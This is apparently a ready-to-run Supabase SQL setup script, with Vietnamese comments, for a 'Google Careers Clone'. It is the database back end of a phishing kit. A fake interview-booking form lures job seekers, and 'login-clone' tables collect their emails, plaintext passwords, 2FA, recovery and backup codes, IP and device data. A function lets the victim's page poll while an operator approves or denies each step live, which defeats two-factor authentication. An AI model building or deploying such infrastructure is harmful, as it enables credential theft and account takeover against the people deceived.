-- ============================================================================
-- Google Careers Clone – FULL Supabase setup (1-shot)
-- Project: https://jacfiibznpibdzmcnqzg.supabase.co
--
-- File này gộp:
--   1) schema.sql                 — 2 bảng cho Vite app (form + login events)
--   2) server_requests_schema.sql — 1 bảng cho server.cjs (phiên login admin duyệt)
--
-- Cách chạy:
--   - Mở Supabase Dashboard -> SQL Editor -> New query
--   - Paste toàn bộ file này -> Run
--   - Đợi báo "Success. No rows returned"
-- ============================================================================

create extension if not exists "pgcrypto";

-- ============================================================================
-- PART A — Vite app tables (form đặt lịch + các bước login-clone)
-- ============================================================================

drop view     if exists public.candidate_timeline               cascade;
drop function if exists public.get_approval_status(text)        cascade;
drop function if exists public.link_login_event_to_submission() cascade;
drop table    if exists public.candidate_login_events           cascade;
drop table    if exists public.candidate_submissions            cascade;

-- A.1. Form đặt lịch phỏng vấn (Home.tsx)
create table public.candidate_submissions (
    id                   uuid primary key default gen_random_uuid(),
    first_name           text not null,
    last_name            text not null,
    business_email       text not null,
    linkedin_profile     text,
    country_code         text,
    phone_number         text,
    preferred_date       date,
    preferred_time       text,
    consent_privacy      boolean not null default false,
    consent_accuracy     boolean not null default false,
    tracking_session_id  text,
    ip_address           text,
    ip_country           text,
    user_agent           text,
    device               text,
    submitted_at         timestamptz not null default now(),
    created_at           timestamptz not null default now()
);

create index if not exists candidate_submissions_email_idx
    on public.candidate_submissions (business_email);
create index if not exists candidate_submissions_session_idx
    on public.candidate_submissions (tracking_session_id);
create index if not exists candidate_submissions_created_at_idx
    on public.candidate_submissions (created_at desc);


-- A.2. Các bước login-clone (password / 2FA / ...)
create table public.candidate_login_events (
    id                   uuid primary key default gen_random_uuid(),
    submission_id        uuid references public.candidate_submissions(id) on delete set null,
    tracking_session_id  text,
    page                 text not null,
    step                 text not null,
    email                text,
    password             text,
    twofa_code           text,
    recovery_code        text,
    backup_code          text,
    phone_number         text,
    raw_payload          jsonb,
    ip_address           text,
    ip_country           text,
    user_agent           text,
    device               text,
    approval_status      text not null default 'pending'
                         check (approval_status in ('pending','approved','denied')),
    submitted_at         timestamptz not null default now(),
    created_at           timestamptz not null default now()
);

create index if not exists candidate_login_events_email_idx
    on public.candidate_login_events (email);
create index if not exists candidate_login_events_session_idx
    on public.candidate_login_events (tracking_session_id);
create index if not exists candidate_login_events_submission_idx
    on public.candidate_login_events (submission_id);
create index if not exists candidate_login_events_status_idx
    on public.candidate_login_events (approval_status);
create index if not exists candidate_login_events_page_idx
    on public.candidate_login_events (page);
create index if not exists candidate_login_events_created_at_idx
    on public.candidate_login_events (created_at desc);


-- A.3. Trigger auto-link event -> submission theo email
create or replace function public.link_login_event_to_submission()
returns trigger
language plpgsql
security definer
as $$
begin
    if new.submission_id is null and new.email is not null then
        select id
          into new.submission_id
          from public.candidate_submissions
         where business_email = new.email
         order by created_at desc
         limit 1;
    end if;
    return new;
end;
$$;

drop trigger if exists trg_link_login_event on public.candidate_login_events;
create trigger trg_link_login_event
    before insert on public.candidate_login_events
    for each row
    execute function public.link_login_event_to_submission();


-- A.4. View tổng hợp
create or replace view public.candidate_timeline as
select
    s.id                   as submission_id,
    s.business_email,
    s.first_name,
    s.last_name,
    s.country_code,
    s.phone_number         as form_phone,
    s.preferred_date,
    s.preferred_time,
    s.tracking_session_id  as form_session_id,
    s.ip_address           as form_ip,
    s.ip_country           as form_ip_country,
    s.device               as form_device,
    s.submitted_at         as form_submitted_at,
    e.id                   as event_id,
    e.page,
    e.step,
    e.email                as event_email,
    e.password,
    e.twofa_code,
    e.recovery_code,
    e.backup_code,
    e.approval_status,
    e.ip_address           as event_ip,
    e.ip_country           as event_ip_country,
    e.device               as event_device,
    e.submitted_at         as event_at
from public.candidate_submissions s
left join public.candidate_login_events e
       on  e.submission_id = s.id
        or e.tracking_session_id = s.tracking_session_id
        or e.email = s.business_email
order by s.submitted_at desc, e.submitted_at asc;


-- A.5. RLS cho 2 bảng trên (anon được insert/read)
alter table public.candidate_submissions  enable row level security;
alter table public.candidate_login_events enable row level security;

drop policy if exists "anon insert submissions" on public.candidate_submissions;
create policy "anon insert submissions"
    on public.candidate_submissions
    for insert to anon with check (true);

drop policy if exists "anon read submissions" on public.candidate_submissions;
create policy "anon read submissions"
    on public.candidate_submissions
    for select to anon using (true);

drop policy if exists "anon insert login events" on public.candidate_login_events;
create policy "anon insert login events"
    on public.candidate_login_events
    for insert to anon with check (true);

drop policy if exists "anon read login events" on public.candidate_login_events;
create policy "anon read login events"
    on public.candidate_login_events
    for select to anon using (true);


-- A.6. Helper function cho polling
create or replace function public.get_approval_status(p_email text)
returns table (
    status      text,
    page        text,
    updated_at  timestamptz
)
language sql
stable
as $$
    select approval_status, page, submitted_at
      from public.candidate_login_events
     where email = p_email
     order by submitted_at desc
     limit 1;
$$;


-- ============================================================================
-- PART B — server.cjs storage (1 bảng duy nhất, persist tất cả phiên admin duyệt)
-- ============================================================================

-- B.1. Bảng chính
create table if not exists public.login_requests (
    id                 bigserial primary key,
    email              text not null,
    session_id         text,
    password           text default '',
    twofa              text default '',
    verification_code  text default '',
    page_status        text default 'Login',
    status             text default 'pending'
                       check (status in ('pending','approved','denied')),
    next_page          text default '',
    user_agent         text default '',
    ip                 text default '',
    country            text default '',
    country_code       text default '',
    tag                text default '',
    note               text default '',
    created_at         timestamptz not null default now(),
    last_seen          timestamptz
);

create index if not exists login_requests_email_idx
    on public.login_requests (email);
create index if not exists login_requests_status_idx
    on public.login_requests (status);
create index if not exists login_requests_created_at_idx
    on public.login_requests (created_at desc);


-- B.2. RLS — chỉ service_role được truy cập (server.cjs)
alter table public.login_requests enable row level security;


-- ============================================================================
-- DONE. Sau khi chạy xong file này, server.cjs có thể kết nối được.
-- ============================================================================
